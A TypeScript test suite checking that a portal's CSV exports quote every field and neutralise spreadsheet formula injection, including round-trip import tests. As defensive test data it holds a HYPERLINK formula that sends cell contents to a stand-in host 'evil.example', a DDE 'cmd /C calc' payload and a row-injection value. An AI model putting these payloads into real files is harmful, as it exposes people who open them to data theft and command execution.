import './helpers/env.js';
// Exported logs hold attacker-reachable text (LOGIN_FAILED stores the submitted username), so every
// field must survive quoting and must not run as a formula when the file is opened in a spreadsheet.
import { describe, test } from 'node:test';
import assert from 'node:assert/strict';
import type { CopilotMcpLogEntry, PortalAdminLogEntry } from '../src/types/governance.js';
import { buildCsv, csvCell, portalAuditCsv, profilesCsv, trafficLogCsv } from '../src/components/views/csvExport.js';
import { parseProfilesCsv } from '../src/db/importers.js';

/** RFC 4180 reader, so the tests assert what a spreadsheet would see rather than the raw text. */
function parseCsv(text: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = '';
  let quoted = false;
  for (let i = 0; i < text.length; i += 1) {
    const ch = text[i];
    if (quoted) {
      if (ch === '"' && text[i + 1] === '"') {
        cell += '"';
        i += 1;
      } else if (ch === '"') {
        quoted = false;
      } else {
        cell += ch;
      }
    } else if (ch === '"') {
      quoted = true;
    } else if (ch === ',') {
      row.push(cell);
      cell = '';
    } else if (ch === '\n') {
      row.push(cell);
      rows.push(row);
      row = [];
      cell = '';
    } else {
      cell += ch;
    }
  }
  row.push(cell);
  rows.push(row);
  return rows;
}

const FORMULA = '=HYPERLINK("http://evil.example/?x="&A1,"click")';

describe('csvCell', () => {
  test('quotes every field, including plain text and numbers', () => {
    assert.equal(csvCell('abc'), '"abc"');
    assert.equal(csvCell(42), '"42"');
    assert.equal(csvCell(true), '"true"');
  });

  test('null and undefined become an empty field', () => {
    assert.equal(csvCell(null), '""');
    assert.equal(csvCell(undefined), '""');
  });

  test('doubles embedded quotes', () => {
    assert.equal(csvCell('say "hi"'), '"say ""hi"""');
  });

  for (const lead of ['=', '+', '-', '@', '\t', '\r', '\n']) {
    test(`a cell beginning with ${JSON.stringify(lead)} is prefixed with a single quote`, () => {
      assert.equal(csvCell(`${lead}cmd`), `"'${lead}cmd"`);
    });
  }

  test('a formula with quotes is both neutralised and escaped', () => {
    assert.equal(parseCsv(csvCell(FORMULA))[0][0], `'${FORMULA}`);
  });

  test('a formula character later in the cell is left alone', () => {
    assert.equal(csvCell('a=b+c-d@e'), '"a=b+c-d@e"');
  });

  test('a negative number is neutralised like any other cell', () => {
    assert.equal(csvCell(-1), `"'-1"`);
  });

  test('an embedded newline stays inside the quoted cell', () => {
    assert.equal(csvCell('line1\nline2'), '"line1\nline2"');
    assert.equal(csvCell('line1\r\nline2'), '"line1\r\nline2"');
  });
});

describe('buildCsv', () => {
  test('a value with a comma, quote and newline cannot add rows or columns', () => {
    const hostile = 'x","=1+1"\n"evil","row';
    const parsed = parseCsv(buildCsv(['A', 'B'], [[hostile, 'second']]));
    assert.deepEqual(parsed, [
      ['A', 'B'],
      [hostile, 'second'],
    ]);
  });

  test('with no rows it is just the header', () => {
    assert.equal(buildCsv(['A', 'B'], []), '"A","B"');
  });
});

describe('exports', () => {
  const auditRow: PortalAdminLogEntry = {
    id: 'log_1',
    timestamp: '2026-11-01T10:00:00.000Z',
    adminUsername: '=cmd|\' /C calc\'!A0',
    authMethod: 'password',
    action: 'LOGIN_FAILED',
    target: '@target',
    details: 'multi\nline "details"',
    ipAddress: '+10.0.0.1',
  };

  const trafficRow: CopilotMcpLogEntry = {
    id: 'mcp_1',
    timestamp: '2026-11-01T10:00:00.000Z',
    sfUsername: '-user@acme.com',
    profileId: '00e000000000001',
    profileName: 'Sales, "West"\nTeam',
    matchedGroups: [],
    toolName: 'soql_query',
    targetObject: '=Account',
    status: 'ALLOWED',
    latencyMs: 12,
    sanitizedRequestPayload: '{}',
    sanitizedResponseSummary: '{}',
    simulated: true,
  };

  test('the login name on a LOGIN_FAILED row, the attacker-reachable path, is neutralised', () => {
    const [header, row] = parseCsv(portalAuditCsv([auditRow]));
    assert.equal(row.length, header.length);
    assert.equal(row[header.indexOf('AdminUsername')], `'${auditRow.adminUsername}`);
    assert.equal(row[header.indexOf('Target')], "'@target");
    assert.equal(row[header.indexOf('Details')], auditRow.details);
    assert.equal(row[header.indexOf('IpAddress')], "'+10.0.0.1");
  });

  test('every traffic field goes through the helper', () => {
    const [header, row] = parseCsv(trafficLogCsv([trafficRow]));
    assert.deepEqual(header, ['Id', 'Timestamp', 'User', 'ProfileId', 'ProfileName', 'Tool', 'TargetObject', 'Status', 'LatencyMs', 'Simulated']);
    assert.deepEqual(row, [
      'mcp_1',
      '2026-11-01T10:00:00.000Z',
      "'-user@acme.com",
      '00e000000000001',
      'Sales, "West"\nTeam',
      'soql_query',
      "'=Account",
      'ALLOWED',
      '12',
      'true',
    ]);
  });

  test('a real traffic row reads as not simulated', () => {
    const { simulated: _omitted, ...real } = trafficRow;
    const [header, row] = parseCsv(trafficLogCsv([real]));
    assert.equal(row[header.indexOf('Simulated')], 'false');
  });

  test('profile names from an org or an import are neutralised too', () => {
    const parsed = parseCsv(profilesCsv([{ id: '00e000000000001', name: '@SUM(A1:A9)', updatedAt: '2026-11-01' }]));
    assert.deepEqual(parsed, [
      ['ProfileId', 'ProfileName', 'UpdatedAt'],
      ['00e000000000001', "'@SUM(A1:A9)", '2026-11-01'],
    ]);
  });

  test('every row of a multi-row export stays separate', () => {
    assert.equal(parseCsv(portalAuditCsv([auditRow, auditRow, auditRow])).length, 4);
  });
});

describe('re-importing a profiles export', () => {
  const roundTrip = (name: string) =>
    parseProfilesCsv(profilesCsv([{ id: '00e000000000001', name, updatedAt: '2026-11-01' }]));

  // A line feed is left out: parseProfilesCsv splits lines before reading quotes, so such a name never reaches a cell.
  for (const name of ['=Ops', '+Ops', '-Ops', '@Ops', '\tOps', '\rOps']) {
    test(`${JSON.stringify(name)} comes back without the apostrophe the export added`, () => {
      assert.ok(profilesCsv([{ id: 'x', name, updatedAt: '' }]).includes(`"'${name}"`), 'control: the export neutralised it');
      assert.deepEqual(roundTrip(name), [{ id: '00e000000000001', name }]);
    });
  }

  test('a second export and import still gives the same name', () => {
    const [first] = roundTrip('-Ops');
    assert.deepEqual(roundTrip(first.name), [{ id: '00e000000000001', name: '-Ops' }]);
  });

  for (const name of ['System Administrator', "'Support", "''-Ops", "O'Brien Team", "'"]) {
    test(`${JSON.stringify(name)} keeps its apostrophes, since the export added none`, () => {
      assert.deepEqual(roundTrip(name), [{ id: '00e000000000001', name }]);
    });
  }

  test('a CRLF file with the apostrophe in a quoted cell parses the same way', () => {
    assert.deepEqual(parseProfilesCsv('ProfileId,ProfileName\r\n00e000000000001,"\'-Ops"\r\n'), [
      { id: '00e000000000001', name: '-Ops' },
    ]);
  });
});
